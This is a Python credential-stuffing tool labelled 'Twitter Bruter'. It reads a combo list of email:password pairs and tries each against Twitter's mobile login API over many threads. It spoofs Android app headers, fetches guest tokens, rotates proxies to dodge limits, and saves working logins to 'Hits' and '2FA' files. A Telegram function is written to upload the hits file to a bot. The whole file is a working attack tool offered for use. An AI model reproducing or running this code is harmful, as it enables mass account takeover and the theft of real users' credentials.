import sys
import requests
from uuid import uuid4
import re
import time
import os
import json
from colorama import Fore
import concurrent.futures
from user_agent import generate_user_agent
from colorama import Fore
import threading
import random
""" Coded By @anasxzer00 """
os.system('clear')
print(Fore.YELLOW+" -- Twitter Bruter | Made By @anasxzer00 ")
""" Coded By @anasxzer00 """
bss = 0
uus = 0
anasxzer00_your_father = 0
hit = 0
bad = 0
retry_count = 0
""" Coded By @anasxzer00 """
lock = threading.Lock()
logo_printed = False
""" Coded By @anasxzer00 """
""" Coded By @anasxzer00 """
""" Coded By @anasxzer00 """
""" Coded By @anasxzer00 """
""" Coded By @anasxzer00 """
""" Coded By @anasxzer00 """
logo = f'''{Fore.CYAN}

'''
print(logo)

anasxzer00 = input(Fore.YELLOW+" [x] Enter 1 to start: ")

def mc_tools_code_by_anasxzer00(email, password):
  try:
    global hit, bad, retry_count, anasxzer00_your_father
    real_hits = []
    two_factor = []
    try:
        with open("/storage/emulated/0/anasxzer00.txt", "r") as f:
            cc = f.read().strip()
            access_token, guest_token = cc.split("✓")
    except:
        coded_by_anasxzer00()
        with open("/storage/emulated/0/anasxzer00.txt", "r") as f:
            cc = f.read().strip()
            access_token, guest_token = cc.split("✓")
    headers = {
      'User-Agent': "TwitterAndroid/10.68.1-release.0 (310681000-r-0) Redmi+Note+8+Pro/11 (Xiaomi;Redmi+Note+8+Pro;Redmi;begonia;0;;0;2016)",
      'Accept': "application/json",  
      'Content-Type': "application/json", 
      'authorization': f"Bearer {access_token}", 
      'x-guest-token': guest_token,
      'system-user-agent': "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011)",
    }
    response = requests.post("https://api.twitter.com/1.1/onboarding/task.json", params = {
      'flow_name': "login",
      'api_version': "1",
      'known_device_token': "",
      'sim_country_code': "ye"
    }, data=json.dumps({
      "input_flow_data": {
        "country_code": None,
        "flow_context": {
          "referrer_context": {
            "referral_details": "utm_source=google-play&utm_medium=organic",
            "referrer_url": ""
          },
          "start_location": {
            "location": "splash_screen"
          }
        },
        "requested_variant": None,
        "target_user_id": 0
      },
      "subtask_versions": {
        "generic_urt": 3,
        "standard": 1,
        "open_home_timeline": 1,
        "app_locale_update": 1,
        "enter_date": 1,
        "email_verification": 3,
        "deregister_device": 1,
        "enter_password": 5,
        "enter_text": 6,
        "one_tap": 2,
        "cta": 7,
        "single_sign_on": 1,
        "fetch_persisted_data": 1,
        "enter_username": 3,
        "web_modal": 2,
        "fetch_temporary_password": 1,
        "menu_dialog": 1,
        "sign_up_review": 5,
        "user_recommendations_urt": 3,
        "in_app_notification": 1,
        "sign_up": 2,
        "typeahead_search": 1,
        "app_attestation": 1,
        "user_recommendations_list": 4,
        "cta_inline": 1,
        "contacts_live_sync_permission_prompt": 3,
        "choice_selection": 5,
        "js_instrumentation": 1,
        "alert_dialog_suppress_client_events": 1,
        "privacy_options": 1,
        "topics_selector": 1,
        "wait_spinner": 3,
        "tweet_selection_urt": 1,
        "end_flow": 1,
        "settings_list": 7,
        "open_external_link": 1,
        "phone_verification": 5,
        "security_key": 3,
        "select_banner": 2,
        "upload_media": 1,
        "web": 2,
        "alert_dialog": 1,
        "open_account": 2,
        "passkey": 1,
        "action_list": 2,
        "enter_phone": 2,
        "open_link": 1,
        "show_code": 1,
        "update_users": 1,
        "check_logged_in_account": 1,
        "enter_email": 2,
        "select_avatar": 4,
        "location_permission_prompt": 2,
        "notifications_permission_prompt": 4
      }
    }), headers=headers)
    if 'att' in response.headers:
      AT = (response.headers)['att']
      tok = response.json()["flow_token"]
      headers.update({'att': AT})
      res = requests.post("https://api.twitter.com/1.1/onboarding/task.json", data=json.dumps({
      "flow_token": tok,
      "subtask_inputs": [
        {
          "enter_text": {
            "challenge_response": None,
            "suggestion_id": None,
            "text": email,
            "link": "next_link"
          },
          "subtask_id": "LoginEnterUserIdentifier"
        }
      ],
      "subtask_versions": {
        "generic_urt": 3,
        "standard": 1,
        "open_home_timeline": 1,
        "app_locale_update": 1,
        "enter_date": 1,
        "email_verification": 3,
        "deregister_device": 1,
        "enter_password": 5,
        "enter_text": 6,
        "one_tap": 2,
        "cta": 7,
        "single_sign_on": 1,
        "fetch_persisted_data": 1,
        "enter_username": 3,
        "web_modal": 2,
        "fetch_temporary_password": 1,
        "menu_dialog": 1,
        "sign_up_review": 5,
        "user_recommendations_urt": 3,
        "in_app_notification": 1,
        "sign_up": 2,
        "typeahead_search": 1,
        "app_attestation": 1,
        "user_recommendations_list": 4,
        "cta_inline": 1,
        "contacts_live_sync_permission_prompt": 3,
        "choice_selection": 5,
        "js_instrumentation": 1,
        "alert_dialog_suppress_client_events": 1,
        "privacy_options": 1,
        "topics_selector": 1,
        "wait_spinner": 3,
        "tweet_selection_urt": 1,
        "end_flow": 1,
        "settings_list": 7,
        "open_external_link": 1,
        "phone_verification": 5,
        "security_key": 3,
        "select_banner": 2,
        "upload_media": 1,
        "web": 2,
        "alert_dialog": 1,
        "open_account": 2,
        "passkey": 1,
        "action_list": 2,
        "enter_phone": 2,
        "open_link": 1,
        "show_code": 1,
        "update_users": 1,
        "check_logged_in_account": 1,
        "enter_email": 2,
        "select_avatar": 4,
        "location_permission_prompt": 2,
        "notifications_permission_prompt": 4
      }
    }), headers=headers)
      
      if "flow_token" in res.text:
        tok2 = res.json()["flow_token"]
        req = requests.post("https://api.twitter.com/1.1/onboarding/task.json", data=json.dumps({
          "flow_token": tok2,
          "subtask_inputs": [
            {
              "enter_password": {
                "password": password,
                "link": "next_link"
              },
              "subtask_id": "LoginEnterPassword"
            }
          ],
          "subtask_versions": {
            "generic_urt": 3,
            "standard": 1,
            "open_home_timeline": 1,
            "app_locale_update": 1,
            "enter_date": 1,
            "email_verification": 3,
            "deregister_device": 1,
            "enter_password": 5,
            "enter_text": 6,
            "one_tap": 2,
            "cta": 7,
            "single_sign_on": 1,
            "fetch_persisted_data": 1,
            "enter_username": 3,
            "web_modal": 2,
            "fetch_temporary_password": 1,
            "menu_dialog": 1,
            "sign_up_review": 5,
            "user_recommendations_urt": 3,
            "in_app_notification": 1,
            "sign_up": 2,
            "typeahead_search": 1,
            "app_attestation": 1,
            "user_recommendations_list": 4,
            "cta_inline": 1,
            "contacts_live_sync_permission_prompt": 3,
            "choice_selection": 5,
            "js_instrumentation": 1,
            "alert_dialog_suppress_client_events": 1,
            "privacy_options": 1,
            "topics_selector": 1,
            "wait_spinner": 3,
            "tweet_selection_urt": 1,
            "end_flow": 1,
            "settings_list": 7,
            "open_external_link": 1,
            "phone_verification": 5,
            "security_key": 3,
            "select_banner": 2,
            "upload_media": 1,
            "web": 2,
            "alert_dialog": 1,
            "open_account": 2,
            "passkey": 1,
            "action_list": 2,
            "enter_phone": 2,
            "open_link": 1,
            "show_code": 1,
            "update_users": 1,
            "check_logged_in_account": 1,
            "enter_email": 2,
            "select_avatar": 4,
            "location_permission_prompt": 2,
            "notifications_permission_prompt": 4
          }
        }), headers=headers)
        retry_count = 0
        if "user" in req.text and "id" in req.text:
             if 'In order to protect your account' in req.text or 'Help us keep' in req.text or 'Check your email' in req.text or 'https://twitter.com/account/login_challenge?' in req.text or 'Confirmation code' in req.text or 'Use your code' in req.text or 'Enter your' in req.text or 'Password change required' in req.text:
                with lock:
                   anasxzer00_your_father += 1
                with open("/storage/emulated/0/Twitter[2FA].txt","a") as d:
                   d.write(email+':'+password+" | By @anasxzer00"+'\n')
                stats()
             else:
                 with lock:
                     hit += 1
                 with open("/storage/emulated/0/Twitter[Hits].txt","a") as d:
                    d.write(email+':'+password+" | By @anasxzer00"+'\n')
                 stats()
                     
        else:
            with lock:
                bad += 1
            stats()
        
      else:
        with lock:
            bad += 1
        stats()
      
    else:
        with lock:
            retry_count += 1
        stats()
        coded_by_anasxzer00()
  except Exception as e:
      print(e)
def coded_by_anasxzer00():
    global retry_count
    try:
        if anasxzer00.lower() == "yes":
            with open('pr.txt', 'r') as f:
                proxies_list = [line.strip() for line in f]
                proxy = random.choice(proxies_list)
                
                if proxy.count(':') == 3:
                    ip, port, username, password = proxy.split(':')
                    formatted_proxy = f"http://{username}:{password}@{ip}:{port}"
                elif proxy.count(':') == 1:
                    ip, port = proxy.split(':')
                    formatted_proxy = f"http://{ip}:{port}"
                else:
                    exit("Invalid proxy format in proxies.txt.")
                proxies = {
                            "http": formatted_proxy,
                            "https": formatted_proxy,
                        }
                        
                
        else:
            proxies = None
        Access = requests.post("https://api.twitter.com/oauth2/token", data= "grant_type=client_credentials", headers = {
  'User-Agent': "TwitterAndroid/10.68.1-release.0 (310681000-r-0) Redmi+Note+8+Pro/11 (Xiaomi;Redmi+Note+10+Pro;Redmi;begonia;0;;0;2016)",
  'Accept': "application/json",
  'Accept-Encoding': "br, gzip, deflate",
  'Content-Type': "application/x-www-form-urlencoded",
  'timezone': "Asia/Aden",
  'os-security-patch-level': "2022-04-01",
  'optimize-body': "true",
  'x-twitter-client': "TwitterAndroid",
  'x-attest-token': "no_token",
  'x-twitter-client-adid': "20d041fe-7911-446c-9a92-035ed8ab0904",
  'x-twitter-client-language': "ar-EG",
  'x-client-uuid': "7032db5b-591f-4f73-842b-2f9e52516871",
  'x-twitter-client-deviceid': "137d1fbe27f7dc2d",
  'authorization': "Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw==",
  'x-twitter-client-version': "10.68.1-release.0",
  'cache-control': "no-store",
  'x-twitter-active-user': "no",
  'x-twitter-api-version': "5",
  'x-twitter-client-limit-ad-tracking': "0",
  'x-b3-traceid': "dbffbe7a8d609493",
  'accept-language': "ar-EG",
  'x-twitter-client-flavor': ""
}, proxies=proxies, timeout=3).json()["access_token"]
        headers = {
  'User-Agent': "TwitterAndroid/10.68.1-release.0 (310681000-r-0) Redmi+Note+8+Pro/11 (Xiaomi;Redmi+Note+8+Pro;Redmi;begonia;0;;0;2016)",
  'Accept': "application/json",  
  'Content-Type': "application/json", 
  'authorization': f"Bearer {Access}", 
  'system-user-agent': "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011)",
}
        try:
           gs = requests.post("https://api.twitter.com/1.1/guest/activate.json", headers=headers).json()["guest_token"]
        except:
            with lock:
                retry_count += 1
            stats()
            coded_by_anasxzer00()
        try:
            os.remove("/storage/emulated/0/anasxzer00.txt")
        except:
            pass
        with open("/storage/emulated/0/anasxzer00.txt", "w") as f:
            f.write(f"{Access}✓{gs}")

    except requests.RequestException:
        if anasxzer00.lower() == "y341les":
            with lock:
                retry_count += 1
            stats()
        else:
        	retry_count += 1
        	stats()
        	coded_by_anasxzer00()  
def stats():
    global hit, bad, anasxzer00_your_father, retry_count, logo_printed
    if not logo_printed:
        print(logo)
        logo_printed = True
    with lock:
        sys.stdout.write(f"\r[x] {Fore.GREEN}Hits{Fore.WHITE}: {hit} // {Fore.RED}Bad{Fore.WHITE}: {bad} // {Fore.YELLOW}Retries: {Fore.WHITE}{retry_count} // {Fore.YELLOW}2FA{Fore.WHITE}: {anasxzer00_your_father} ")
        sys.stdout.flush()

def send_hits_to_telegram():
    telegram_token = ""
    telegram_chat_id = ""

    with open('hits.txt', 'r') as f:
        hits_count = len(f.readlines())

    message = f"Checking finished! Found {hits_count} hits."

    files = {'document': open('hits.txt', 'rb')}
    response = requests.post(
        f"https://api.telegram.org/bot{telegram_token}/sendDocument",
        data={'chat_id': telegram_chat_id},
        files=files
    )

    response = requests.post(
        f"https://api.telegram.org/bot{telegram_token}/sendMessage",
        data={'chat_id': telegram_chat_id, 'text': message}
    )
def main():
    file = input(" [X] Put Combo: ")
    num_threads = int(input(Fore.CYAN+' [+] Number of threads (enter 10): '))
    os.system('clear')
    try:
        with open(file, "r") as f:
            lines = [line.strip() for line in f]
    except FileNotFoundError:
        print(Fore.RED+"[x] File not found. Please enter a valid file name.")
        main()

    threads = []
    request_count = 0
    coded_by_anasxzer00()  
    for line in lines:
        email = line.split(':')[0]
        password = line.split(':')[1]
        t = threading.Thread(target=mc_tools_code_by_anasxzer00, args=(email, password))
        threads.append(t)
        t.start()
        request_count += 1
        if request_count >= 75:
            coded_by_anasxzer00()
            request_count = 0
        if len(threads) >= num_threads:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()